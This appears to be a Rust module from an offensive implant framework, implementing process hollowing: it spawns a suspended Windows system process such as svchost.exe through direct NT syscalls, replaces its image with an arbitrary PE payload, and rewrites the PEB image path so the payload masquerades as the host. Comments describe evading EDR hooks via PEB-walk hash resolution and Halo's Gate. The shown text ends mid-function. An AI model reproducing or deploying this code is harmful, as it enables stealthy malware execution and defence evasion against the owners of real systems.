use anyhow::{anyhow, Result};
#[cfg(windows)]
use winapi::ctypes::c_void;

/// Section descriptor for `rva_to_file_offset_sections` — platform-agnostic
/// so the conversion logic can be unit-tested without `#[cfg(windows)]`.
#[cfg(any(windows, test))]
#[derive(Clone, Copy)]
struct SectionDesc {
    virtual_address: usize,
    virtual_size: usize,
    raw_offset: usize,
}

/// Walk a slice of `SectionDesc` entries and convert `rva` to a raw file offset.
///
/// Returns `rva` unchanged when no section contains it (header area, which maps
/// 1:1 for PE files with `SizeOfHeaders` bytes of header data).
#[cfg(any(windows, test))]
fn rva_to_file_offset_sections(rva: usize, sections: &[SectionDesc]) -> usize {
    for sec in sections {
        if rva >= sec.virtual_address && rva < sec.virtual_address + sec.virtual_size {
            return rva - sec.virtual_address + sec.raw_offset;
        }
    }
    // Fallback: header area (rva < SizeOfHeaders) maps 1:1.
    rva
}

/// Convert a Relative Virtual Address (RVA) from the PE optional-header data
/// directories to a raw file offset by walking the section table.
///
/// The data-directory fields (e.g. `IMAGE_DIRECTORY_ENTRY_BASERELOC`,
/// `IMAGE_DIRECTORY_ENTRY_IMPORT`) store *virtual* addresses relative to the
/// image base, **not** offsets into the on-disk file.  Using an RVA directly
/// as a file offset is only accidentally correct for packed/aligned images
/// where `VirtualAddress == PointerToRawData`.  For general PE files the two
/// values differ and we must walk the section headers.
///
/// # Safety
///
/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS64` structure.
/// The section headers immediately following it must also be valid and in-bounds.
#[cfg(windows)]
unsafe fn rva_to_file_offset(
    rva: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS64,
) -> usize {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS64>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let descs: Vec<SectionDesc> = (0..num_sections)
        .map(|i| {
            let sec = &*first.add(i);
            SectionDesc {
                virtual_address: sec.VirtualAddress as usize,
                virtual_size: *sec.Misc.VirtualSize() as usize,
                raw_offset: sec.PointerToRawData as usize,
            }
        })
        .collect();
    rva_to_file_offset_sections(rva, &descs)
}

/// PE32 variant of `rva_to_file_offset` for WOW64 payload handling.
///
/// # Safety
///
/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS32` structure.
/// The section headers immediately following it must also be valid and in-bounds.
#[cfg(windows)]
unsafe fn rva_to_file_offset32(
    rva: usize,
    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
) -> usize {
    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS32>())
        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
    let descs: Vec<SectionDesc> = (0..num_sections)
        .map(|i| {
            let sec = &*first.add(i);
            SectionDesc {
                virtual_address: sec.VirtualAddress as usize,
                virtual_size: *sec.Misc.VirtualSize() as usize,
                raw_offset: sec.PointerToRawData as usize,
            }
        })
        .collect();
    rva_to_file_offset_sections(rva, &descs)
}

// ─── NT API infrastructure ────────────────────────────────────────────────
//
// All cross-process operations (process/thread creation, memory allocation,
// read/write, context manipulation) are dispatched through NT functions
// resolved via PEB-walk (pe_resolve), so no IAT entries for kernel32/user32
// Win32 wrappers (CreateProcessA, VirtualAllocEx, WriteProcessMemory, etc.)
// are required.  EDR solutions commonly hook the IAT-visible Win32 entry
// points but cannot safely inline-hook every ntdll syscall stub.

/// NT OBJECT_ATTRIBUTES — required by NtOpenFile, NtCreateSection.
#[cfg(windows)]
#[repr(C)]
struct NtObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut winapi::shared::ntdef::UNICODE_STRING,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

/// NT IO_STATUS_BLOCK — required by NtOpenFile.
#[cfg(windows)]
#[repr(C)]
struct IoStatusBlock {
    pointer: usize, // union: NTSTATUS / PVOID — only return value is checked
    information: usize,
}

// NT constants absent from the winapi features enabled for this crate.
#[cfg(windows)] const NT_OBJ_CASE_INSENSITIVE: u32 = 0x40;
#[cfg(windows)] const NT_FILE_READ_DATA: u32 = 0x0001;
#[cfg(windows)] const NT_FILE_EXECUTE: u32 = 0x0020;
#[cfg(windows)] const NT_SYNCHRONIZE: u32 = 0x0010_0000;
#[cfg(windows)] const NT_FILE_SHARE_READ: u32 = 0x0001;
#[cfg(windows)] const NT_FILE_SHARE_DELETE: u32 = 0x0004;
#[cfg(windows)] const NT_FILE_SYNC_IO_NONALERT: u32 = 0x0000_0020;
#[cfg(windows)] const NT_FILE_NON_DIRECTORY: u32 = 0x0000_0040;
#[cfg(windows)] const NT_SECTION_ALL_ACCESS: u32 = 0x000F_001F;
#[cfg(windows)] const NT_SEC_IMAGE: u32 = 0x0100_0000;
#[cfg(windows)] const NT_PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
#[cfg(windows)] const NT_THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
/// THREAD_CREATE_FLAGS_CREATE_SUSPENDED
#[cfg(windows)] const NT_THREAD_SUSPENDED: u32 = 0x0000_0001;
/// NtCurrentProcess() pseudo-handle (-1).
#[cfg(windows)] const NT_CURRENT_PROCESS: usize = usize::MAX;
/// MEM_RELEASE for NtFreeVirtualMemory.
#[cfg(windows)] const NT_MEM_RELEASE: u32 = 0x8000;

/// Resolve a function from the loaded `ntdll.dll` via PEB-walk.
#[cfg(windows)]
#[inline]
unsafe fn resolve_nt(name: &[u8]) -> Option<usize> {
    let base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
    pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(name))
}

/// Convert a Win32 DOS path to a `\??\`-prefixed NT namespace path as a
/// null-terminated wide string.
#[cfg(windows)]
fn dos_to_nt_path(dos_path: &str) -> Vec<u16> {
    format!("\\??\\{}", dos_path)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect()
}

/// Return a prioritised list of host-process paths to try for hollowing.
/// Using a list avoids hard failures on hardened environments where
/// `svchost.exe` has been moved or renamed.
#[cfg(windows)]
fn host_candidate_paths() -> Vec<String> {
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    vec![
        format!(r"{}\System32\svchost.exe", sysroot),
        format!(r"{}\System32\RuntimeBroker.exe", sysroot),
        format!(r"{}\System32\dllhost.exe", sysroot),
        format!(r"{}\System32\werfault.exe", sysroot),
    ]
}

/// Create a new suspended process from `exe_path` using NT direct syscalls:
///   NtOpenFile → NtCreateSection(SEC_IMAGE) → NtCreateProcessEx → NtCreateThreadEx
///
/// All NT functions are dispatched through `nt_syscall::syscall!` (SSN resolved
/// via Halo's Gate or clean-ntdll mapping) so no hooked IAT entries are needed.
///
/// Returns `(hProcess, hThread)`.  The caller must close both handles.
#[cfg(windows)]
unsafe fn create_suspended_process_nt(exe_path: &str) -> Result<(*mut c_void, *mut c_void)> {
    // Build NT namespace path and UNICODE_STRING.
    let mut path_wide = dos_to_nt_path(exe_path);
    let byte_len = ((path_wide.len() - 1) * 2) as u16;
    let mut ustr = winapi::shared::ntdef::UNICODE_STRING {
        Length: byte_len,
        MaximumLength: byte_len + 2,
        Buffer: path_wide.as_mut_ptr(),
    };
    let mut oa = NtObjectAttributes {
        length: std::mem::size_of::<NtObjectAttributes>() as u32,
        root_directory: std::ptr::null_mut(),
        object_name: &mut ustr,
        attributes: NT_OBJ_CASE_INSENSITIVE,
        security_descriptor: std::ptr::null_mut(),
        security_quality_of_service: std::ptr::null_mut(),
    };
    let mut isb = IoStatusBlock { pointer: 0, information: 0 };

    let mut h_file: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtOpenFile",
        &mut h_file as *mut _ as u64,
        (NT_FILE_READ_DATA | NT_FILE_EXECUTE | NT_SYNCHRONIZE) as u64,
        &mut oa as *mut _ as u64,
        &mut isb as *mut _ as u64,
        (NT_FILE_SHARE_READ | NT_FILE_SHARE_DELETE) as u64,
        (NT_FILE_SYNC_IO_NONALERT | NT_FILE_NON_DIRECTORY) as u64,
    ).map_err(|e| anyhow!("NtOpenFile SSN: {e}"))?;
    if s < 0 || h_file.is_null() {
        return Err(anyhow!("NtOpenFile({}) NTSTATUS {:#010x}", exe_path, s as u32));
    }

    let mut h_section: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtCreateSection",
        &mut h_section as *mut _ as u64,
        NT_SECTION_ALL_ACCESS as u64,
        0u64,
        0u64,
        winapi::um::winnt::PAGE_EXECUTE_READ as u64,
        NT_SEC_IMAGE as u64,
        h_file as u64,
    ).map_err(|e| anyhow!("NtCreateSection SSN: {e}"))?;
    // Close file handle regardless of section creation result.
    let _ = nt_syscall::syscall!("NtClose", h_file as u64);
    if s < 0 || h_section.is_null() {
        return Err(anyhow!("NtCreateSection({}) NTSTATUS {:#010x}", exe_path, s as u32));
    }

    let mut h_process: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtCreateProcessEx",
        &mut h_process as *mut _ as u64,
        NT_PROCESS_ALL_ACCESS as u64,
        0u64,
        NT_CURRENT_PROCESS as u64,
        0u64,
        h_section as u64,
        0u64,
        0u64,
        0u64,
    ).map_err(|e| anyhow!("NtCreateProcessEx SSN: {e}"))?;
    let _ = nt_syscall::syscall!("NtClose", h_section as u64);
    if s < 0 || h_process.is_null() {
        return Err(anyhow!("NtCreateProcessEx({}) NTSTATUS {:#010x}", exe_path, s as u32));
    }

    // Resolve a suitable thread start routine inside ntdll.
    let start_addr = resolve_nt(b"RtlUserThreadStart\0")
        .or_else(|| resolve_nt(b"LdrInitializeThunk\0"))
        .ok_or_else(|| anyhow!("RtlUserThreadStart not found in ntdll"))?;

    let mut h_thread: *mut c_void = std::ptr::null_mut();
    let s = nt_syscall::syscall!(
        "NtCreateThreadEx",
        &mut h_thread as *mut _ as u64,
        NT_THREAD_ALL_ACCESS as u64,
        0u64,
        h_process as u64,
        start_addr as u64,
        0u64,
        NT_THREAD_SUSPENDED as u64,
        0u64,
        0u64,
        0u64,
        0u64,
    ).map_err(|e| anyhow!("NtCreateThreadEx SSN: {e}"))?;
    if s < 0 || h_thread.is_null() {
        let _ = nt_syscall::syscall!("NtTerminateProcess", h_process as u64, 1u64);
        let _ = nt_syscall::syscall!("NtClose", h_process as u64);
        return Err(anyhow!("NtCreateThreadEx({}) NTSTATUS {:#010x}", exe_path, s as u32));
    }

    Ok((h_process, h_thread))
}

/// M-26 Part E: load a DLL into our own process via `LdrLoadDll` (resolved via
/// PEB walk) instead of the hookable `LoadLibraryA` IAT entry. Returns 0 on
/// failure, in which case the caller leaves the corresponding IAT slot empty.
#[cfg(windows)]
unsafe fn ldr_load_local(dll_name: &str) -> usize {
    let ntdll = match pe_resolve::get_module_handle_by_hash(
        pe_resolve::hash_str(b"ntdll.dll\0"),
    ) {
        Some(b) => b,
        None => return 0,
    };
    let ldr_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"LdrLoadDll\0"),
    ) {
        Some(a) => a,
        None => return 0,
    };
    type LdrLoadDllFn = unsafe extern "system" fn(
        *mut u16,
        *mut u32,
        *mut winapi::shared::ntdef::UNICODE_STRING,
        *mut *mut winapi::ctypes::c_void,
    ) -> i32;
    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_addr as *const ());

    let wide: Vec<u16> = dll_name
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let mut us: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
    us.Length = ((wide.len().saturating_sub(1)) * 2) as u16;
    us.MaximumLength = (wide.len() * 2) as u16;
    us.Buffer = wide.as_ptr() as *mut _;
    let mut base_out: *mut winapi::ctypes::c_void = std::ptr::null_mut();
    let status = ldr_load_dll(
        std::ptr::null_mut(),
        std::ptr::null_mut(),
        &mut us,
        &mut base_out,
    );
    if status >= 0 {
        base_out as usize
    } else {
        0
    }
}

/// Return the export-directory tuple for a PE image regardless of bitness.
///
/// Returns `(export_rva, export_size, export_dir_ptr)` on success.
#[cfg(windows)]
unsafe fn local_get_export_directory(
    base: usize,
) -> Option<(u32, usize, *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY)> {
    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_base = base + (*dos_header).e_lfanew as usize;
    if *(nt_base as *const u32) != winapi::um::winnt::IMAGE_NT_SIGNATURE {
        return None;
    }

    let opt_magic = *((nt_base
        + 4
        + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()) as *const u16);

    let export_data_dir = match opt_magic {
        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt_headers32 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
            (*nt_headers32).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        }
        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt_headers64 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
            (*nt_headers64).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        }
        _ => return None,
    };

    if export_data_dir.VirtualAddress == 0 {
        return None;
    }

    let ed = (base + export_data_dir.VirtualAddress as usize)
        as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
    Some((
        export_data_dir.VirtualAddress,
        export_data_dir.Size as usize,
        ed,
    ))
}

/// M-26 Part E: resolve an export by ordinal from a clean module image.
/// Mirrors `agent::syscalls::get_export_addr_by_ordinal` so the hollowing
/// crate doesn't need to depend on agent or call hooked GetProcAddress.
#[cfg(windows)]
unsafe fn local_get_export_addr_by_ordinal(base: usize, ordinal: u32) -> *mut std::ffi::c_void {
    use std::ffi::CStr;

    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
        return std::ptr::null_mut();
    }

    let (export_dir_rva, export_dir_size, ed) = match local_get_export_directory(base) {
        Some(v) => v,
        None => return std::ptr::null_mut(),
    };

    let base_ordinal = (*ed).Base;
    let num_funcs = (*ed).NumberOfFunctions;
    let funcs = (base + (*ed).AddressOfFunctions as usize) as *const u32;
    if ordinal < base_ordinal {
        return std::ptr::null_mut();
    }
    let idx = (ordinal - base_ordinal) as usize;
    if idx >= num_funcs as usize {
        return std::ptr::null_mut();
    }
    let func_rva = *funcs.add(idx) as usize;
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    // Forwarder: RVA points inside export directory, so it is an ASCII
    // "DLL.Func" string rather than executable code.
    let export_start = export_dir_rva as usize;
    let export_end = export_start.saturating_add(export_dir_size);
    if func_rva >= export_start && func_rva < export_end {
        let forward_ptr = (base + func_rva) as *const i8;
        let forward = match CStr::from_ptr(forward_ptr).to_str() {
            Ok(s) => s,
            Err(_) => return std::ptr::null_mut(),
        };

        let (dll_part, symbol_part) = match forward.find('.') {
            Some(i) => (&forward[..i], &forward[i + 1..]),
            None => return std::ptr::null_mut(),
        };

        let dll_name = if dll_part.to_ascii_lowercase().ends_with(".dll") {
            dll_part.to_string()
        } else {
            format!("{}.dll", dll_part)
        };

        // Load forwarded target via ntdll!LdrLoadDll to avoid hookable
        // LoadLibraryA/GetProcAddress IAT paths.
        let loaded_base = ldr_load_local(&dll_name);
        if loaded_base == 0 {
            return std::ptr::null_mut();
        }

        let mut dll_name_nul = dll_name.as_bytes().to_vec();
        dll_name_nul.push(0);
        let dll_hash = pe_resolve::hash_str(&dll_name_nul);
        let hmod = pe_resolve::get_module_handle_by_hash(dll_hash).unwrap_or(loaded_base);
        if hmod == 0 {
            return std::ptr::null_mut();
        }

        if let Some(ord_str) = symbol_part.strip_prefix('#') {
            let ord = match ord_str.parse::<u16>() {
                Ok(v) => v,
                Err(_) => return std::ptr::null_mut(),
            };
            return local_get_export_addr_by_ordinal(hmod, ord as u32);
        }

        let mut symbol_nul = symbol_part.as_bytes().to_vec();
        symbol_nul.push(0);
        let symbol_hash = pe_resolve::hash_str(&symbol_nul);
        return pe_resolve::get_proc_address_by_hash(hmod, symbol_hash)
            .map(|a| a as *mut std::ffi::c_void)
            .unwrap_or(std::ptr::null_mut());
    }

    (base + func_rva) as *mut std::ffi::c_void
}

/// Hollow a new suspended process and execute the provided PE payload inside it.
///
/// The host process is chosen from a prioritised candidate list (svchost.exe,
/// RuntimeBroker.exe, dllhost.exe, werfault.exe) so the function does not hard-
/// fail if svchost.exe has been moved or renamed in a hardened environment.
///
/// Process creation uses NtCreateProcessEx + NtCreateThreadEx (resolved via
/// PEB-walk) instead of the IAT-visible CreateProcessA.  All subsequent cross-
/// process operations (memory allocation, read/write, context get/set, resume)
/// also use NT functions resolved through pe_resolve to avoid IAT entries.
#[cfg(windows)]
pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
    use std::mem::zeroed;
    use winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER,
        IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE,
        MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
    };

    // NtClose for handle cleanup via direct syscall.
    macro_rules! close_handle {
        ($h:expr) => {
            let _ = nt_syscall::syscall!("NtClose", $h as u64);
        };
    }

    if payload.len() < 2 || payload[0] != b'M' || payload[1] != b'Z' {
        return Err(anyhow!(
            "hollow_and_execute: payload is not a PE (no MZ header)"
        ));
    }

    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
    let e_lfanew = unsafe { (*dos).e_lfanew } as usize;
    let nt_sig_off = e_lfanew;
    let opt_magic_off = e_lfanew
        .saturating_add(4)
        .saturating_add(std::mem::size_of::<IMAGE_FILE_HEADER>());
    if opt_magic_off + 2 > payload.len() {
        return Err(anyhow!(
            "hollow_and_execute: PE too small for OptionalHeader.Magic"
        ));
    }
    if nt_sig_off + 4 > payload.len() {
        return Err(anyhow!("hollow_and_execute: PE too small for NT signature"));
    }
    let nt_sig = u32::from_le_bytes(payload[nt_sig_off..nt_sig_off + 4].try_into().unwrap());
    if nt_sig != IMAGE_NT_SIGNATURE {
        return Err(anyhow!("hollow_and_execute: invalid NT signature"));
    }
    let opt_magic =
        u16::from_le_bytes(payload[opt_magic_off..opt_magic_off + 2].try_into().unwrap());
    if opt_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC {
        return unsafe { hollow_and_execute_pe32(payload) };
    }

    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
        return Err(anyhow!("hollow_and_execute: PE too small for NT headers"));
    }
    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS64;
    unsafe {
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
        }
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(anyhow!("hollow_and_execute: invalid NT signature"));
        }
        let opt_magic = (*nt).OptionalHeader.Magic;
        if opt_magic != winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            return Err(anyhow!(
                "hollow_and_execute: only PE64 payloads are supported (found OptionalHeader.Magic=0x{:x})",
                opt_magic
            ));
        }

        let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
        let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;

        // Ensure the SSN resolution infrastructure (clean ntdll mapping) is
        // initialised before any direct-syscall dispatch.  Errors are soft:
        // the crate degrades to bootstrap (Halo's Gate) SSN resolution.
        let _ = nt_syscall::init_syscall_infrastructure();

        macro_rules! nt_terminate_process {
            ($h:expr) => {
                let _ = nt_syscall::syscall!("NtTerminateProcess", $h as u64, 1u64);
            };
        }

        // Create the host process using NT direct syscalls.
        let (h_process, h_thread, host_path) = {
            let mut result: Result<(*mut c_void, *mut c_void)> =
                Err(anyhow!("hollow_and_execute: all host process candidates failed"));
            let mut chosen_path = String::new();
            for path in host_candidate_paths() {
                match create_suspended_process_nt(&path) {
                    Ok(handles) => {
                        chosen_path = path;
                        result = Ok(handles);
                        break;
                    }
                    Err(e) => tracing::debug!(
                        "hollow_and_execute: candidate {} failed: {}", path, e),
                }
            }
            result.map(|(a, b)| (a, b, chosen_path))?
        };

        // Get PEB address via NtQueryInformationProcess(ProcessBasicInformation=0).
        //
        // PROCESS_BASIC_INFORMATION layout (x64):
        //   +0x00 ExitStatus      4 bytes
        //   +0x08 PebBaseAddress  8 bytes  (4-byte padding before on x64)
        //   total = 48 bytes
        let mut pbi = [0u8; 48];
        let mut ret_len: u32 = 0;
        let s = nt_syscall::syscall!(
            "NtQueryInformationProcess",
            h_process as u64, 0u64,
            pbi.as_mut_ptr() as u64, 48u64,
            &mut ret_len as *mut _ as u64,
        ).map_err(|e| anyhow!("NtQueryInformationProcess SSN: {e}"))?;
        if s < 0 || ret_len < 16 {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute: NtQueryInformationProcess NTSTATUS {:#010x}", s as u32));
        }
        let peb_addr = usize::from_le_bytes(pbi[8..16].try_into().unwrap());
        if peb_addr == 0 {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!("hollow_and_execute: PEB address is NULL"));
        }
        let peb_ptr = peb_addr as *const u8;

        // Read PEB.ImageBaseAddress (offset 0x10) and unmap the original image.
        let mut remote_image_base: usize = 0;
        let mut rd: usize = 0;
        let read_status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_process as u64,
            peb_ptr.add(0x10) as u64,
            &mut remote_image_base as *mut _ as u64,
            std::mem::size_of::<usize>() as u64,
            &mut rd as *mut _ as u64,
        );
        if let Err(e) = &read_status {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!(
                "hollow_and_execute: NtReadVirtualMemory(PEB.ImageBaseAddress) failed: {}", e));
        }
        if let Ok(s) = read_status {
            if s < 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtReadVirtualMemory(PEB.ImageBaseAddress) NTSTATUS {:#010x}",
                    s as u32));
            }
        }
        if remote_image_base != 0 {
            let us = nt_syscall::syscall!(
                "NtUnmapViewOfSection",
                h_process as u64, remote_image_base as u64,
            ).unwrap_or(-1);
            if us < 0 {
                tracing::warn!(
                    "hollow_and_execute: NtUnmapViewOfSection NTSTATUS {:#010x}; continuing",
                    us as u32);
            }
        } else {
            tracing::warn!("hollow_and_execute: remote_image_base is NULL; skipping unmap");
        }

        // Allocate payload space (RW; execute applied per-section after write).
        let mut alloc_base = preferred_base as *mut c_void;
        let mut alloc_size = image_size;
        let s = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            h_process as u64, &mut alloc_base as *mut _ as u64,
            0u64, &mut alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
        ).unwrap_or(-1);
        let remote_base_ptr = if s < 0 || alloc_base.is_null() {
            let mut fb: *mut c_void = std::ptr::null_mut();
            let mut fb_size = image_size;
            let s2 = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                h_process as u64, &mut fb as *mut _ as u64,
                0u64, &mut fb_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
            ).unwrap_or(-1);
            if s2 < 0 || fb.is_null() {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "NtAllocateVirtualMemory failed: NTSTATUS {:#010x}", s2 as u32));
            }
            fb
        } else {
            alloc_base
        };
        let remote_base = remote_base_ptr as usize;
        let mut written: usize = 0;

        // Write PE headers.
        let s = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64, remote_base_ptr as u64,
            payload.as_ptr() as u64,
            (*nt).OptionalHeader.SizeOfHeaders as u64,
            &mut written as *mut _ as u64,
        ).unwrap_or(-1);
        if s < 0 {
            nt_terminate_process!(h_process);
            close_handle!(h_thread);
            close_handle!(h_process);
            return Err(anyhow!("NtWriteVirtualMemory(headers) failed"));
        }

        // Write sections.
        let num_sections = (*nt).FileHeader.NumberOfSections as usize;
        let first_section =
            (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
            as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
        for i in 0..num_sections {
            let sec = &*first_section.add(i);
            let raw_off = sec.PointerToRawData as usize;
            let raw_sz  = sec.SizeOfRawData as usize;
            let virt_sz = *sec.Misc.VirtualSize() as usize;
            let copy_sz = raw_sz.min(virt_sz);
            if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
                continue;
            }
            let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
            let s = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                h_process as u64, dst as u64,
                payload.as_ptr().add(raw_off) as u64,
                copy_sz as u64,
                &mut written as *mut _ as u64,
            ).unwrap_or(-1);
            if s < 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!("NtWriteVirtualMemory(section {}) failed", i));
            }
        }

        let delta = remote_base as isize - preferred_base as isize;
        if delta != 0 {
            let reloc_dir = &(*nt).OptionalHeader.DataDirectory
                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
            if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: preferred base unavailable and PE has no reloc directory"));
            }
            apply_relocations_remote(h_process, remote_base, nt, payload, delta)?;
        }

        // Resolve and write the Import Address Table.
        fix_iat_remote(h_process, remote_base, nt, payload, &mut written)?;

        // Apply per-section execute/write permissions.
        apply_section_protections(h_process, remote_base, nt);

        // Flush instruction cache for the newly written image.
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            h_process as u64, remote_base_ptr as u64,
            (*nt).OptionalHeader.SizeOfImage as u64,
        );

        // Update PEB.ImageBaseAddress.
        let peb_write_status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            h_process as u64, peb_ptr.add(0x10) as u64,
            &remote_base as *const _ as u64,
            std::mem::size_of::<usize>() as u64,
            &mut written as *mut _ as u64,
        );
        match peb_write_status {
            Ok(s) if s >= 0 => {}
            Ok(s) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) NTSTATUS {:#010x}",
                    s as u32));
            }
            Err(e) => {
                nt_terminate_process!(h_process);
                close_handle!(h_thread);
                close_handle!(h_process);
                return Err(anyhow!(
                    "hollow_and_execute: NtWriteVirtualMemory(PEB.ImageBaseAddress) failed: {}", e));
            }
        }

        // ── Update PEB ProcessParameters (ImagePathName / CommandLine) ───────
        // After replacing the image, update the RTL_USER_PROCESS_PARAMETERS so
        // that the hollowed process reports the host process path when queried
        // via PEB walk.  This keeps the process appearance consistent with the
        // host executable that was used to create the suspended process.
        //
        // PEB (x64) layout:
        //   +0x20  ProcessParameters  (pointer to RTL_USER_PROCESS_PARAMETERS)
        //
        // RTL_USER_PROCESS_PARAMETERS (x64) layout:
        //   +0x60  ImagePathName      (UNICODE_STRING: Length, MaxLength, Buffer)
        //   +0x70  CommandLine        (UNICODE_STRING: Length, MaxLength, Buffer)
        //
        // UNICODE_STRING (x64) = { Length: u16, MaxLength: u16, _pad: u32, Buffer: *mut u16 }
        //   total = 16 bytes on x64
        {
            // Read the ProcessParameters pointer from PEB+0x20.
            let mut params_ptr: usize = 0;
            let mut rd_params: usize = 0;
            let params_read = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                h_process as u64,
                peb_ptr.add(0x20) as u64,
                &mut params_ptr as *mut _ as u64,
                std::mem::size_of::<usize>() as u64,
                &mut rd_params as *mut _ as u64,
            );
            match params_read {
                Ok(s) if s >= 0 && rd_params == std::mem::size_of::<usize>() && params_ptr != 0 => {}
                _ => {
                    tracing::warn!(
                        "hollow_and_execute: failed to read PEB.ProcessParameters, skipping update"
                    );
                    // Non-fatal: the process can still run without this update.
                }
            }

            if params_ptr != 0 {
                let params_addr = params_ptr as *const u8;

                // Build a wide (UTF-16LE) version of the host path for the
                // UNICODE_STRING buffers.  We use the NT path format
                // (\??\C:\...) since that is what the kernel stores.
                let wide_path = dos_to_nt_path(&host_path);
                // dos_to_nt_path already null-terminates.
                // Length excludes the trailing null.
                let path_byte_len = (wide_path.len().saturating_sub(1)) * 2;

                // Allocate remote memory for the wide path string.
                let mut str_buf: *mut c_void = std::ptr::null_mut();
                let mut str_buf_sz: usize = (wide_path.len() * 2 + 64) & !63; // page-aligned
                let alloc_status = nt_syscall::syscall!(
                    "NtAllocateVirtualMemory",
                    h_process as u64, &mut str_buf as *mut _ as u64,
                    0u64, &mut str_buf_sz as *mut _ as u64,
                    (MEM_COMMIT | MEM_RESERVE) as u64, PAGE_READWRITE as u64,
                ).unwrap_or(-1);
